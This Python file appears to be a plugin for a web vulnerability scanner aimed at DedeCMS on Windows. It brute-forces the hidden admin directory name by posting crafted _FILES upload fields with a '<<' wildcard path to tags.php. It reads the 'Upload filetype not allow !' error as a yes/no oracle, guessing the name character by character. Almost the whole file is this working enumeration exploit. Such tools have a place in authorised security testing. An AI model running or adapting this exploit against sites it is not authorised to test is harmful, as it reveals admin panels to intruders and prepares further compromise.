#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

"""
    https://xz.aliyun.com/t/2064 find manage
"""

import itertools

def get_script_info(data=None):
    script_info = {
        "name": "dedecms_win_find_manage",
        "info": "dedecms_win_find_manage.",
        "level": "low",
        "type": "info"
    }
    return script_info

def prove(data):
    '''
    比较耗时，建议单独跑脚本
    '''
    data = init(data, 'web')
    if data['base_url']:
        characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
        _data = {
            "_FILES[mochazz][tmp_name]": "./{p}<</images/adminico.gif",
            "_FILES[mochazz][name]": 0,
            "_FILES[mochazz][size]": 0,
            "_FILES[mochazz][type]": "image/gif"
        }
        for a in ['', 'dedecms/']:
            url = data['base_url'] + a + 'tags.php'
            back_dir = ""
            flag = 0
            res = curl('get', url)
            if res!=None and res.status_code ==200:
                for num in range(1, 7):
                    if flag ==1 :
                        break
                    for pre in itertools.permutations(characters, num):
                        pre = ''.join(list(pre))
                        _data["_FILES[mochazz][tmp_name]"] = _data["_FILES[mochazz][tmp_name]"].format(p=pre)
                        r = curl('post', url, data=_data)
                        if r!=None:
                            if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                                flag = 1
                                back_dir = pre
                                _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                                break
                            else:
                                _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                flag = 0
                x = 0
                for i in range(30):
                    if flag == 1:
                        x = i
                        break
                    for ch in characters:
                        if ch == characters[-1]:
                            flag = 1
                            x = i
                            break
                        _data["_FILES[mochazz][tmp_name]"] = _data["_FILES[mochazz][tmp_name]"].format(p=back_dir + ch)
                        r = curl('post', url, data=_data)
                        if r != None:
                            if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                                back_dir += ch
                                _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                                break
                            else:
                                _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"

                if x < 29 and flag ==1:

                    data['flag'] = 1
                    data['data'].append({"url": back_dir})
                    data['res'].append({"info": back_dir, "key": 'dede_manage'})
    return data
